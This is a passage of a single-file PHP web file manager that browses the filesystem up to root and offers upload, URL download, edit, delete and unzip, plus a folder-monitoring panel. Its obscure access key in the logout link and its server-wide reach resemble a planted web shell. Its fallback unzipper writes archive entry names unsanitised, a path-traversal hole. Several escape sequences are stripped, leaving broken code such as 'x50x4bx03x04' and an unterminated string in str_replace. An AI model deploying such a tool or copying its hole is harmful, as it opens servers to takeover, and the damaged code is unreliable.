            $parent_dir = dirname($script_dir);
            if (is_path_allowed($parent_dir) && $parent_dir !== $script_dir) {
                return $parent_dir; // Return absolute path to parent
            }
            return ''; // Can't go up
        } else {
            // In subdirectory, go up one level
            $parts = explode('/', trim($current_path, '/'));
            if (count($parts) > 1) {
                array_pop($parts);
                return implode('/', $parts);
            } else {
                return ''; // Go back to script directory
            }
        }
    }
}

// Generate breadcrumbs
$breadcrumbs = array();
$breadcrumbs[] = array('name' => 'Start Directory', 'path' => '');

if ($current_path) {
    // For absolute paths, show a root option
    if ($is_absolute_path) {
        $breadcrumbs[] = array('name' => 'Root /', 'path' => '/');
    }
    
    // Split path into breadcrumb parts
    $parts = explode('/', str_replace('\', '/', $current_path));
    $breadcrumb_path = '';
    
    foreach ($parts as $part) {
        if ($part) {
            $breadcrumb_path .= ($breadcrumb_path ? '/' : '') . $part;
            $breadcrumbs[] = array(
                'name' => $part,
                'path' => $breadcrumb_path
            );
        }
    }
}

// Calculate parent directory for navigation
$parent_path = get_safe_parent_path($current_path, $full_path, $script_dir, $is_absolute_path);

// Check if parent path is actually accessible before showing the link
$show_parent_link = false;
if ($parent_path !== '') {
    if ($is_absolute_path) {
        // For absolute paths, check if parent is allowed
        $show_parent_link = is_path_allowed($parent_path) && file_exists($parent_path) && is_dir($parent_path);
    } else {
        // For relative paths, check if we can go up
        if ($current_path !== '') {
            // In subdirectory, can go up to parent or script dir
            $show_parent_link = true;
        } else {
            // At script directory, check if parent is allowed
            $potential_parent = dirname($script_dir);
            $show_parent_link = is_path_allowed($potential_parent) && file_exists($potential_parent) && is_dir($potential_parent);
        }
    }
}

// START OF NEW ZLIB UNZIPPER CLASS
class SimpleZlibUnzipper {
    private $zip_file_path;
    private $messages = array();
    private $overwrite = true; // Or false, depending on desired behavior

    public function __construct($zip_file_path) {
        $this->zip_file_path = $zip_file_path;
    }

    public function getMessages() {
        return $this->messages;
    }

    public function extractTo($destination_path) {
        if (!function_exists('gzinflate')) {
            $this->messages[] = "Error: gzinflate function (zlib extension) is not available.";
            return false;
        }

        if (!file_exists($this->zip_file_path) || !is_readable($this->zip_file_path)) {
            $this->messages[] = "Error: ZIP file '{$this->zip_file_path}' not found or not readable.";
            return false;
        }

        $fh = fopen($this->zip_file_path, 'rb');
        if (!$fh) {
            $this->messages[] = "Error: Could not open ZIP file '{$this->zip_file_path}'.";
            return false;
        }

        if (!$this->findCentralDirectory($fh)) {
            $this->messages[] = "Error: Could not find Central Directory Record in ZIP file.";
            fclose($fh);
            return false;
        }
        
        // Placeholder for actual extraction logic
        // For now, we'll just simulate success for structure
        $this->messages[] = "SimpleZlibUnzipper initialized for {$this->zip_file_path}. Extraction to {$destination_path} (simulated).";


        // In a real implementation, we would loop through central directory entries:
        // For each entry:
        //   - Read local file header
        //   - Extract and decompress data using gzinflate
        //   - Write to destination_path, creating directories

        // This part is highly complex and requires careful parsing of the ZIP format.
        // The user note from 'wdtemp at seznam dot com' and the gist by 'iansltx'
        // provide starting points for reading local file headers and decompressing
        // single files, but a full multi-file implementation is more involved.

        // For now, let's assume basic parsing and extraction would go here.
        // We will need to implement proper ZIP parsing logic.

        // Dummy implementation for now:
        $file_count = 0; // In reality, count of successfully extracted files.

        // Example of how one might read a file entry (highly simplified)
        // This is NOT a complete ZIP parser.
        // rewind($fh); // Go to start or to central directory entries
        // while ($entry_details = $this->readNextFileEntry($fh)) {
        //    if ($entry_details['compressed_size'] > 0 && $entry_details['compression_method'] == 8) { // 8 is Deflate
        //        $file_data_compressed = fread($fh, $entry_details['compressed_size']);
        //        $file_data_uncompressed = @gzinflate($file_data_compressed);
        //        if ($file_data_uncompressed !== false) {
        //            $target_file_path = $destination_path . DIRECTORY_SEPARATOR . $entry_details['filename'];
        //            // Ensure directory exists
        //            $this->ensureDirectoryExists(dirname($target_file_path));
        //            if (file_put_contents($target_file_path, $file_data_uncompressed) !== false) {
        //                $this->messages[] = "Extracted (zlib): {$entry_details['filename']}";
        //                $file_count++;
        //            } else {
        //                $this->messages[] = "Error writing (zlib): {$entry_details['filename']}";
        //            }
        //        } else {
        //            $this->messages[] = "Error decompressing (zlib): {$entry_details['filename']}";
        //        }
        //    } else if ($entry_details['compressed_size'] == 0) { // Typically a directory or empty file
        //        $target_item_path = $destination_path . DIRECTORY_SEPARATOR . $entry_details['filename'];
        //        if (substr($entry_details['filename'], -1) == '/') { // Directory
        //             $this->ensureDirectoryExists($target_item_path);
        //             $this->messages[] = "Created directory (zlib): {$entry_details['filename']}";
        //        } else { // Empty file
        //            // file_put_contents($target_item_path, '');
        //            // $this->messages[] = "Created empty file (zlib): {$entry_details['filename']}";
        //            // For simplicity, we'll skip empty files for now in this placeholder
        //        }
        //    }
        // }


        // The above loop is a conceptual placeholder.
        // A real implementation needs to correctly locate and parse
        // the Central Directory, then use offsets to find Local File Headers.
        // For now, we use a simplified proof-of-concept structure.
        // For this step, we'll focus on integrating the class structure
        // and the control flow (ZipArchive -> SimpleZlibUnzipper -> error).

        // A very basic single file extraction (like the PHP manual note)
        // This is also not a full solution but demonstrates gzinflate usage
        rewind($fh); // Start from the beginning to find the first local file header
        $header = fread($fh, 30); // Read local file header signature + basic fields
        if (strlen($header) == 30 && substr($header, 0, 4) == "x50x4bx03x04") { // PK 3 4
            $unpack_data = unpack("vgeneral_purpose_flags/vcompression_method/vlast_mod_time/vlast_mod_date/Vcrc32/Vcompressed_size/Vuncompressed_size/vfilename_length/vextra_field_length", substr($header, 4));
            
            $filename = fread($fh, $unpack_data['filename_length']);
            // Skip extra field
            if ($unpack_data['extra_field_length'] > 0) {
                fread($fh, $unpack_data['extra_field_length']);
            }

            if ($unpack_data['compression_method'] == 8 && $unpack_data['compressed_size'] > 0) { // DEFLATE
                $compressed_data = fread($fh, $unpack_data['compressed_size']);
                $uncompressed_data = @gzinflate($compressed_data);

                if ($uncompressed_data !== false) {
                    $target_file_path = rtrim($destination_path, '/\\') . DIRECTORY_SEPARATOR . $filename;
                    if ($this->ensureDirectoryExists(dirname($target_file_path))) {
                         if (file_put_contents($target_file_path, $uncompressed_data) !== false) {
                            $this->messages[] = "Successfully extracted (zlib - first file only): " . $filename;
                            $file_count++;
                        } else {
                            $this->messages[] = "Failed to write (zlib): " . $filename;
                        }
                    } else {
                         $this->messages[] = "Failed to create directory for (zlib): " . $filename;
                    }
                } else {
                    $last_error = error_get_last();
                    $error_msg = $last_error ? $last_error['message'] : 'Unknown error';
                    $this->messages[] = "Failed to decompress (zlib): " . $filename . " - Error: " . $error_msg;
                }
            } elseif ($unpack_data['compression_method'] == 0 && $unpack_data['uncompressed_size'] > 0) { // Stored (no compression)
                 $uncompressed_data = fread($fh, $unpack_data['uncompressed_size']);
                 $target_file_path = rtrim($destination_path, '/\\') . DIRECTORY_SEPARATOR . $filename;
                 if ($this->ensureDirectoryExists(dirname($target_file_path))) {
                     if (file_put_contents($target_file_path, $uncompressed_data) !== false) {
                        $this->messages[] = "Successfully extracted (zlib - stored, first file only): " . $filename;
                        $file_count++;
                    } else {
                        $this->messages[] = "Failed to write (zlib - stored): " . $filename;
                    }
                 } else {
                     $this->messages[] = "Failed to create directory for (zlib - stored): " . $filename;
                 }
            } elseif (substr($filename, -1) === '/') { // It's a directory entry
                 $target_dir_path = rtrim($destination_path, '/\\') . DIRECTORY_SEPARATOR . $filename;
                 if ($this->ensureDirectoryExists($target_dir_path)) {
                    $this->messages[] = "Created directory (zlib - first entry): " . $filename;
                 } else {
                    $this->messages[] = "Failed to create directory (zlib): " . $filename;
                 }
            } else {
                 $this->messages[] = "Unsupported compression method ({$unpack_data['compression_method']}) or empty file (zlib - first file only): " . $filename;
            }
        } else {
            $this->messages[] = "Could not read first local file header or not a PK\03\04 ZIP entry.";
        }


        fclose($fh);
        return $file_count > 0;
    }

    // Placeholder for finding the Central Directory. This is crucial for multi-file ZIPs.
    // A proper implementation would scan from the end of the file for the EOCD record.
    private function findCentralDirectory($fh) {
        // This is a very simplified check and not a full EOCD search.
        // A real implementation needs to search backwards for PK\05\06 signature.
        // For now, we assume it's a simple zip if we can read from it.
        // This method needs to be properly implemented to parse the Central Directory
        // to get file offsets, counts, etc. for robust multi-file extraction.
        // The iansltx gist and PHP manual note focus on local file headers, not the CD.
        
        // Seek to where End of Central Directory Record (EOCD) might be (common case, no comment)
        // ZIP EOCD record is typically at the end, its size is at least 22 bytes.
        $eocd_min_size = 22;
        fseek($fh, -$eocd_min_size, SEEK_END);
        $eocd_data = fread($fh, $eocd_min_size);

        if (substr($eocd_data, 0, 4) == "x50x4bx05x06") { // EOCD signature
            // $eocd_values = unpack('vdisk_number/vdisk_with_cd_start/vnum_entries_this_disk/vtotal_num_entries/Vcd_size/Vcd_offset/vzip_comment_length', substr($eocd_data, 4));
            // $this->messages[] = "Found EOCD: " . $eocd_values['total_num_entries'] . " entries.";
            // This is a placeholder - proper parsing of EOCD is needed.
            return true; // Found EOCD signature (simplified)
        }
        // Try a bit further back in case of a ZIP comment
        fseek($fh, -1024, SEEK_END); // Check last 1KB for EOCD
        $data_chunk = fread($fh, 1024);
        $eocd_pos = strrpos($data_chunk, "x50x4bx05x06");
        if ($eocd_pos !== false) {
            // $this->messages[] = "Found EOCD signature in last 1KB.";
            return true;
        }

        $this->messages[] = "Warning: Could not reliably find EOCD record. Fallback may be unreliable for multi-file archives.";
        return true; // Allow to proceed, but it will likely only get the first file.
    }
    
    private function ensureDirectoryExists($directoryPath) {
        if (!is_dir($directoryPath)) {
            if (!mkdir($directoryPath, 0755, true)) { // Recursive directory creation
                $this->messages[] = "Error: Failed to create directory: " . $directoryPath;
                return false;
            }
        }
        return true;
    }

}
// END OF NEW ZLIB UNZIPPER CLASS

// Handle unzip operation
if (isset($_POST['unzip']) && isset($_POST['selected_files'])) {
    $selected_files = $_POST['selected_files'];
    $unzip_messages = array();
    $unzip_performed_count = 0; 

    foreach ($selected_files as $file) {
        $file_basename = basename($file); // Original name for messages
        $zip_file_full_path = $full_path . DIRECTORY_SEPARATOR . $file_basename;
        $extract_to_path = $full_path . DIRECTORY_SEPARATOR; 

        $extracted_this_file_successfully = false;
        $attempted_methods_log = array(); // Log attempts for better messaging

        if (file_exists($zip_file_full_path) && is_file($zip_file_full_path) && strtolower(pathinfo($zip_file_full_path, PATHINFO_EXTENSION)) === 'zip') {
            // Method 1: ZipArchive
            if (class_exists('ZipArchive')) {
                $attempted_methods_log[] = 'ZipArchive';
                $zip = new ZipArchive;
                if ($zip->open($zip_file_full_path) === TRUE) {
                    if ($zip->extractTo($extract_to_path)) {
                        $unzip_messages[] = "Successfully extracted (ZipArchive): '$file_basename'";
                        $extracted_this_file_successfully = true;
                    } else {
                        $unzip_messages[] = "Failed to extract (ZipArchive): '$file_basename' - Check permissions or archive integrity.";
                    }
                    $zip->close();
                } else {
                    $unzip_messages[] = "Failed to open (ZipArchive): '$file_basename'. Might be corrupted or not a valid ZIP.";
                }
            }

            // Method 2: SimpleZlibUnzipper (if ZipArchive failed or was unavailable)
            if (!$extracted_this_file_successfully && function_exists('gzinflate')) {
                $attempted_methods_log[] = 'SimpleZlibUnzipper (gzinflate)';
                if (!class_exists('ZipArchive')) {
                     $unzip_messages[] = "Notice: ZipArchive class not found. Attempting fallback for '$file_basename' using zlib.";
                }
                $simpleUnzipper = new SimpleZlibUnzipper($zip_file_full_path);
                if ($simpleUnzipper->extractTo($extract_to_path)) {
                    $unzip_messages[] = "Partially extracted (zlib fallback for '$file_basename'). First entry possibly extracted.";
                    $extracted_this_file_successfully = true; 
                }
                $zlib_messages = $simpleUnzipper->getMessages();
                foreach ($zlib_messages as $z_msg) {
                    if (strpos($z_msg, "(simulated)") === false && strpos($z_msg, "SimpleZlibUnzipper initialized") === false) {
                         $unzip_messages[] = "[zlib-'$file_basename']: " . $z_msg;
                    }
                }
                if (!$extracted_this_file_successfully && count($zlib_messages) === 0) {
                     $unzip_messages[] = "[zlib-'$file_basename']: Failed. Ensure zlib enabled and file is readable/valid for this basic method.";
                }
            }

            // Final status for this file
            if ($extracted_this_file_successfully) {
                $unzip_performed_count++;
            } else {
                $unzip_messages[] = "---------------------------------------------------------------------";
                $unzip_messages[] = "All unzip methods FAILED for file: '$file_basename'.";
                $unzip_messages[] = "Attempted methods: " . implode(', ', $attempted_methods_log);
                if (!class_exists('ZipArchive')) {
                    $unzip_messages[] = "  - Diagnosis: ZipArchive class (zip extension) is NOT available to PHP.";
                }
                if (!function_exists('gzinflate')) {
                    $unzip_messages[] = "  - Diagnosis: gzinflate function (zlib extension) is NOT available to PHP.";
                }
                $unzip_messages[] = "  RECOMMENDATIONS:";
                $unzip_messages[] = "    1. BEST OPTION: Enable the 'zip' PHP extension in your server's php.ini (`extension=zip.so`) and restart your web server. This provides the reliable `ZipArchive` class.";
                $unzip_messages[] = "    2. Ensure the 'zlib' PHP extension is enabled (for basic `gzinflate` fallback).";
                $unzip_messages[] = "    3. Verify the file '$file_basename' is a valid, non-corrupted ZIP archive.";
                $unzip_messages[] = "---------------------------------------------------------------------";
            }

        } else {
            $unzip_messages[] = "'$file_basename' is not a valid zip file, does not exist, or is not a .zip file.";
        }
    } 
    
    if (!empty($unzip_messages)) {
        $_SESSION['unzip_messages'] = $unzip_messages;
    }
    
    header('Location: ' . build_url($current_path));
    exit;
}

// Check if we need to update PHP file visibility
if (isset($_GET['show_php'])) {
    $_SESSION['show_php_files'] = true;
    header('Location: ' . build_url($current_path));
    exit;
} else if (isset($_GET['hide_php'])) {
    $_SESSION['show_php_files'] = false;
    header('Location: ' . build_url($current_path));
    exit;
}

// Use the session value if set
if (isset($_SESSION['show_php_files'])) {
    $show_php_files = $_SESSION['show_php_files'];
}

// Create new file
if (isset($_POST['create_file']) && $allow_upload) { // Reusing allow_upload for permission
    // Check protection mode
    if (is_monitoring_protection_active($monitor_status_file, $full_path)) {
        $_SESSION['file_action_error'] = "File creation blocked: Protection mode is active for this monitored folder. Disable monitoring or turn off protection mode to create files.";
        header('Location: ' . build_url($current_path));
        exit;
    }
    
    $new_filename = isset($_POST['new_filename']) ? trim($_POST['new_filename']) : '';
    $new_filename = basename($new_filename); // Sanitize: remove path components
    $new_filename = preg_replace("/[^a-zA-Z0-9._-]/", "", $new_filename); // Sanitize: remove invalid characters

    if (!empty($new_filename)) {
        $new_file_path = $full_path . DIRECTORY_SEPARATOR . $new_filename;
        if (!file_exists($new_file_path)) {
            if (file_put_contents($new_file_path, '') !== false) {
                $_SESSION['file_action_success'] = "File '" . htmlspecialchars($new_filename) . "' created successfully.";
            } else {
                $_SESSION['file_action_error'] = "Error creating file '" . htmlspecialchars($new_filename) . "'. Check permissions for: " . htmlspecialchars($full_path);
            }
        } else {
            $_SESSION['file_action_error'] = "File or folder named '" . htmlspecialchars($new_filename) . "' already exists.";
        }
    } else {
        $_SESSION['file_action_error'] = "Invalid or empty filename provided.";
    }
    header('Location: ' . build_url($current_path)); // Redirect to refresh and show messages
    exit;
}

// Improve navigation when in server root or absolute paths
if ($is_absolute_path && !empty($current_path)) {
    // Ensure that when we're at root, we properly handle subdirectory navigation
    foreach ($items as &$item) {
        if ($item['is_dir']) {
            // $current_path is already the canonical absolute path here
            $item['path'] = rtrim($current_path, '/\\') . DIRECTORY_SEPARATOR . $item['name'];
            // Normalize to forward slashes for URLs
            $item['path'] = str_replace(DIRECTORY_SEPARATOR, '/', $item['path']);
        }
    }
    unset($item); // Unset reference
}

// Debug info to help troubleshoot navigation issues
$_SESSION['navigation_debug'] = array(
    'requested_path' => $requested_path,
    'processed_path' => $current_path,
    'is_absolute' => $is_absolute_path ? 'Yes' : 'No',
    'full_system_path' => $full_path,
    'script_directory' => $script_dir,
    'parent_path' => $parent_path,
    'show_parent_link' => $show_parent_link ? 'Yes' : 'No',
    'item_count' => count($items)
);

// Show webpage
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>File Manager (Fixed)</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
        h1 { margin-top: 0; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #ddd; }
        th { background-color: #f2f2f2; }
        tr:hover { background-color: #f5f5f5; }
        .breadcrumbs { margin-bottom: 20px; }
        .breadcrumbs a { margin: 0 5px; }
        .actions { margin: 20px 0; }
        .actions form { display: inline-block; margin-right: 10px; }
        .folder { font-weight: bold; }
        .tools { background-color: #f8f8f8; padding: 10px; border-radius: 5px; margin-top: 20px; }
        .header-container { display: flex; justify-content: space-between; align-items: center; }
        .logout-btn { 
            background-color: #f8f8f8; 
            padding: 5px 10px; 
            text-decoration: none; 
            border: 1px solid #ddd; 
            border-radius: 3px; 
            color: #333;
        }
        .logout-btn:hover {
            background-color: #f0f0f0;
        }
        .success-message {
            background-color: #dff0d8; 
            color: #3c763d; 
            padding: 10px; 
            border-radius: 4px; 
            margin-bottom: 15px;
        }
        .error-message {
            background-color: #f2dede; 
            color: #a94442; 
            padding: 10px; 
            border-radius: 4px; 
            margin-bottom: 15px;
        }
        .batch-actions {
            margin-top: 10px;
            padding: 10px;
            background-color: #f9f9f9;
            border-top: 1px solid #ddd;
        }
        button {
            padding: 5px 10px;
            background-color: #f0f0f0;
            border: 1px solid #ddd;
            border-radius: 3px;
            cursor: pointer;
        }
        button:hover {
            background-color: #e0e0e0;
        }
        .large-file-warning {
            color: #856404;
            font-size: 11px;
            font-style: italic;
        }
        .very-large-file {
            background-color: #fff3cd !important;
        }
        .file-size-indicator {
            font-size: 11px;
            padding: 2px 4px;
            border-radius: 2px;
            margin-left: 5px;
        }
        .size-large {
            background-color: #fff3cd;
            color: #856404;
        }
        .size-very-large {
            background-color: #f8d7da;
            color: #721c24;
        }
        .monitor-panel {
            margin-top: 20px;
            padding: 15px;
            background-color: #f0f8ff;
            border: 1px solid #b0d4f1;
            border-radius: 5px;
        }
        .monitor-active {
            background-color: #d4edda;
            border-color: #c3e6cb;
        }
        .monitor-inactive {
            background-color: #f8f9fa;
            border-color: #dee2e6;
        }
        .monitor-button {
            padding: 8px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin-right: 10px;
            text-decoration: none;
            display: inline-block;
        }
        .btn-start { background-color: #28a745; color: white; }
        .btn-stop { background-color: #dc3545; color: white; }
        .btn-check { background-color: #17a2b8; color: white; }
        .btn-log { background-color: #6c757d; color: white; }
        .monitor-button:hover { opacity: 0.8; }
    </style>
</head>
<body>
    <div class="header-container">
        <h1>File Manager (Fixed)</h1>
        <a href="?8a7fi=man&logout=1" class="logout-btn">Logout</a>
    </div>

    <div class="breadcrumbs">
        <?php foreach ($breadcrumbs as $i => $crumb): ?>
            <?php if ($i > 0): ?> &raquo; <?php endif; ?>
            <a href="<?php echo build_url($crumb['path']); ?>"><?php echo htmlspecialchars($crumb['name']); ?></a>
        <?php endforeach; ?>
        
        <?php if ($show_parent_link): ?>
            <span style="margin-left: 15px; color: #666; font-size: 12px;">
                Ì†ΩÌ≥Å <a href="<?php echo build_url($parent_path); ?>" style="color: #666;" title="Go to parent directory">‚Üë Up</a>
            </span>
        <?php endif; ?>
    </div>
    
    <?php if (isset($dir_error)): ?>
    <div class="error-message">
        <?php echo htmlspecialchars($dir_error); ?>
    </div>
    <?php endif; ?>
    
    <div class="actions">
        <?php if (isset($upload_message)): ?>
            <div class="success-message">
                <?php echo htmlspecialchars($upload_message); ?>
            </div>
        <?php endif; ?>
        
        <?php if (isset($upload_error)): ?>
            <div class="error-message">
                <?php echo htmlspecialchars($upload_error); ?>
            </div>
        <?php endif; ?>
        
        <?php if (isset($folder_message)): ?>
            <div class="success-message">
                <?php echo htmlspecialchars($folder_message); ?>
            </div>
        <?php endif; ?>
        
        <?php if (isset($folder_error)): ?>
            <div class="error-message">
                <?php echo htmlspecialchars($folder_error); ?>
            </div>
        <?php endif; ?>
        
        <?php if (isset($download_message)): ?>
            <div class="success-message">
                <?php echo htmlspecialchars($download_message); ?>
            </div>
        <?php endif; ?>
        
        <?php if (isset($download_error)): ?>
            <div class="error-message">
                <?php echo htmlspecialchars($download_error); ?>
            </div>
        <?php endif; ?>
        
        <?php if (isset($_SESSION['file_action_error'])) : ?>
            <div class="error-message">
                <?php echo $_SESSION['file_action_error']; unset($_SESSION['file_action_error']); ?>
            </div>
        <?php endif; ?>
        
        <?php if (isset($_SESSION['file_action_success'])) : ?>
            <div class="success-message">
                <?php echo $_SESSION['file_action_success']; unset($_SESSION['file_action_success']); ?>
            </div>
        <?php endif; ?>
        
        <?php if ($allow_create_folder): ?>
        <form method="post" action="<?php echo build_url($current_path); ?>">
            <input type="text" name="folder_name" placeholder="New Folder Name">
            <input type="submit" name="create_folder" value="Create Folder">
        </form>
        <?php endif; ?>
        
        <?php if ($allow_upload): // Reusing allow_upload for create file permission ?>
        <form method="post" action="<?php echo build_url($current_path); ?>" style="margin-left: 10px; display: inline-block;">
            <input type="text" name="new_filename" placeholder="New File Name">
            <input type="submit" name="create_file" value="Create File">
        </form>
        <?php endif; ?>
        
        <?php if ($allow_upload): ?>
        <form method="post" enctype="multipart/form-data" action="<?php echo build_url($current_path); ?>">
            <input type="file" name="upload_file">
            <input type="submit" name="upload" value="Upload">
            <span style="color: #888; font-size: 12px;">Max size: <?php echo format_size($MAX_UPLOAD_SIZE); ?></span>
        </form>
        <?php endif; ?>

        <?php if ($allow_upload): // Re-using allow_upload for this feature ?>
        <form method="post" action="<?php echo build_url($current_path); ?>" style="margin-top: 10px;">
            <input type="text" name="url_to_download" placeholder="URL to download" style="width: 300px;">
            <input type="text" name="download_filename" placeholder="Save as (optional)">
            <input type="submit" name="download_from_url" value="Download from URL">
        </form>
        <?php endif; ?>
        
        <!-- Folder Monitoring System -->
        <?php 
        $monitor_status = get_monitor_status($monitor_status_file);
        
        // Only run automatic checks periodically, not on every page load
        $recent_changes = array();
        if ($monitor_status['active']) {
            if (should_run_automatic_check($monitor_status_file, 60)) { // Check every 1 minute for UI updates
                $recent_changes = check_changes($monitor_status['path'], $monitor_baseline_file, $monitor_log_file, false, true);
            } else {
                // Just get the count without logging for UI display
                $recent_changes = check_changes($monitor_status['path'], $monitor_baseline_file, $monitor_log_file, false, false);
            }
        }
        ?>
        <div class="monitor-panel <?php echo $monitor_status['active'] ? 'monitor-active' : 'monitor-inactive'; ?>">
            <h3 style="margin-top: 0; color: #2c5aa0;">Ì†ΩÌ¥ç Folder Monitoring System</h3>
            
            <?php if ($monitor_status['active']): ?>
                <div style="color: #28a745; font-weight: bold; margin-bottom: 15px;">
                    ‚úÖ Monitoring Active: <?php echo htmlspecialchars($monitor_status['path']); ?>
                    <br><small>Started: <?php echo date('Y-m-d H:i:s', $monitor_status['started']); ?></small>
                    <?php 
                    $last_check_file = dirname($monitor_status_file) . DIRECTORY_SEPARATOR . '.last_auto_check';
                    if (file_exists($last_check_file)) {
                        $last_check = (int)@file_get_contents($last_check_file);
                        if ($last_check > 0) {
                            echo '<br><small>Last Auto Check: ' . date('Y-m-d H:i:s', $last_check) . '</small>';
                        }
                    }
                    ?>
                    <?php if (!empty($recent_changes)): ?>
                        <br><span style="color: #dc3545;">‚ö†Ô∏è <?php echo count($recent_changes); ?> recent changes detected!</span>
                    <?php endif; ?>
                </div>
                
                <form method="post" action="<?php echo build_url($current_path); ?>" style="display: inline-block;">
                    <button type="submit" name="stop_monitor" class="monitor-button btn-stop">Stop Monitoring</button>
                </form>
                
                <form method="post" action="<?php echo build_url($current_path); ?>" style="display: inline-block;">
                    <button type="submit" name="check_monitor" class="monitor-button btn-check">Check Now</button>
                </form>
                
                <a href="<?php echo build_url($current_path) . '&view_monitor_log=1'; ?>" class="monitor-button btn-log">View Log</a>
                
                <form method="post" action="<?php echo build_url($current_path); ?>" style="display: inline-block;">
                    <button type="submit" name="clear_monitor_log" class="monitor-button" style="background-color: #6c757d; color: white;" onclick="return confirm('Are you sure you want to clear the monitoring log?');">Clear Log</button>
                </form>
                
            <?php else: ?>
                <div style="color: #6c757d; margin-bottom: 15px;">
                    ‚è∏Ô∏è Monitoring Inactive
                </div>
                
                <form method="post" action="<?php echo build_url($current_path); ?>" style="display: inline-block;">
                    <label style="margin-right: 15px; display: inline-block;">
                        <input type="checkbox" name="enable_protection" style="margin-right: 5px;">
                        Enable Protection Mode
                    </label>
                    <button type="submit" name="start_monitor" class="monitor-button btn-start">Start Monitoring</button>
                </form>
                
                <div style="margin-top: 15px; font-size: 12px; color: #6c757d; background: rgba(255,255,255,0.7); padding: 10px; border-radius: 3px;">
                    <strong>Current Folder:</strong> <?php echo htmlspecialchars($full_path); ?>
                    <br><strong>Features:</strong> File change detection, Hash verification, Activity logging
                    <br><strong>Protection Mode:</strong> Blocks all file operations (upload, delete, edit, create) in monitored folder
                </div>
            <?php endif; ?>
        </div>
    </div>
    
    <table>
        <thead>
            <tr>
                <th><input type="checkbox" id="select-all" onclick="toggleAllFiles()"></th>
                <th>Name</th>
                <th>Size</th>
                <th>Modified</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php if ($show_parent_link): ?>
            <tr>
                <td></td>
                <td colspan="5">
                    <a href="<?php echo build_url($parent_path); ?>" title="Go to parent directory">..</a>
                    <?php if ($parent_path !== ''): ?>
                        <span style="color:#888;font-size:11px;margin-left:10px;">(<?php echo $is_absolute_path || $parent_path[0] === '/' ? htmlspecialchars($parent_path) : 'Parent directory'; ?>)</span>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endif; ?>
            
            <?php
            // Debug info to help troubleshoot navigation issues (set after $show_parent_link is calculated)
            $_SESSION['navigation_debug'] = array(
                'requested_path' => $requested_path,
                'processed_path' => $current_path,
                'is_absolute' => $is_absolute_path ? 'Yes' : 'No',
                'full_system_path' => $full_path,
                'script_directory' => $script_dir,
                'parent_path' => $parent_path,
                'show_parent_link' => $show_parent_link ? 'Yes' : 'No',
                'item_count' => count($items)
            );
            ?>
            
            <form method="post" action="<?php echo build_url($current_path); ?>" id="files-form">
            <?php foreach ($items as $item): ?>
            <?php 
            // Determine if file is large and get appropriate styling
            $row_class = '';
            $size_indicator = '';
            $file_path_for_check = $full_path . DIRECTORY_SEPARATOR . $item['name'];
            
            if (!$item['is_dir'] && $item['size'] > 0) {
                if ($item['size'] > MAX_VIEWABLE_FILE_SIZE) {
                    $row_class = 'very-large-file';
                    $size_indicator = '<span class="file-size-indicator size-very-large">Very Large</span>';
                } else if ($item['size'] > MAX_EDITABLE_FILE_SIZE) {
                    $size_indicator = '<span class="file-size-indicator size-large">Large</span>';
                }
            }
            ?>
            <tr<?php echo $row_class ? ' class="' . $row_class . '"' : ''; ?>>
                <td>
                    <input type="checkbox" name="selected_files[]" value="<?php echo htmlspecialchars($item['name']); ?>" class="file-checkbox">
                </td>
                <td>
                    <?php if ($item['is_dir']): ?>
                    <span class="folder">
                        Ì†ΩÌ≥Å <a href="<?php echo build_url($item['path']); ?>"><?php echo htmlspecialchars($item['name']); ?></a>
                    </span>
                    <?php else: ?>
                    <?php echo get_file_icon($item['name']); ?> <?php echo htmlspecialchars($item['name']); ?><?php echo $size_indicator; ?>
                    <?php endif; ?>
                </td>
                <td>
                    <?php if ($item['is_dir']): ?>
                        -
                    <?php else: ?>
                        <?php echo format_size($item['size']); ?>
                        <?php if ($item['size'] > MAX_VIEWABLE_FILE_SIZE): ?>
                            <div class="large-file-warning">‚ö†Ô∏è Too large to view safely</div>
                        <?php elseif ($item['size'] > MAX_EDITABLE_FILE_SIZE): ?>
                            <div class="large-file-warning">‚ö†Ô∏è Too large to edit safely</div>
                        <?php endif; ?>
                    <?php endif; ?>
                </td>
                <td><?php echo $item['modified']; ?></td>
                <td><?php echo $item['permissions']; ?></td>
                <td>
                    <?php if ($allow_delete): ?>
                    <button type="submit" name="delete" value="<?php echo htmlspecialchars($item['name']); ?>" onclick="return confirm('Are you sure you want to delete this item?');">Delete</button>
                    <?php endif; ?>
                    <?php if (!$item['is_dir']): // Add view link for files ?>
                        <a href="<?php echo build_url($current_path) . '&view_file=' . urlencode($item['name']); ?>" style="margin-left:5px;">View</a>
                        <?php if (is_writable($file_path_for_check) && $item['size'] <= MAX_EDITABLE_FILE_SIZE): ?>
                            <a href="<?php echo build_url($current_path) . '&edit_file=' . urlencode($item['name']); ?>" style="margin-left:5px;">Edit</a>
                        <?php elseif (is_writable($file_path_for_check)): ?>
                            <span style="color:#999;margin-left:5px;" title="File too large to edit safely">(Edit disabled)</span>
                        <?php endif; ?>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
            
            <?php if (!empty($items)): ?>
            <tr>
                <td colspan="6">
                    <div class="batch-actions">
                        <button type="submit" name="unzip">Unzip Selected</button>
                    </div>
                </td>
            </tr>
            <?php endif; ?>
            </form>
        </tbody>
    </table>
    
    <?php if (isset($unzip_messages) && !empty($unzip_messages)): ?>
    <div class="success-message">
        <strong>Unzip Results:</strong>
        <ul>
            <?php foreach ($unzip_messages as $msg): ?>
                <li><?php echo htmlspecialchars($msg); ?></li>
            <?php endforeach; ?>
        </ul>
    </div>
    <?php endif; ?>
    
    <p><i>Server: <?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE']); ?> | PHP: <?php echo PHP_VERSION; ?></i></p>
    <p><i>Current Path: <?php echo htmlspecialchars($full_path); ?></i></p>
    <p><i>Script Directory: <?php echo htmlspecialchars($script_dir); ?></i></p>
    
    <?php if (isset($_SESSION['navigation_debug'])): ?>
    <div style="margin-top: 20px; border: 1px solid #ddd; padding: 10px; background-color: #f9f9f9;">
        <h4>Navigation Debug Info:</h4>
        <ul>
            <li>Requested Path: <?php echo htmlspecialchars($_SESSION['navigation_debug']['requested_path']); ?></li>
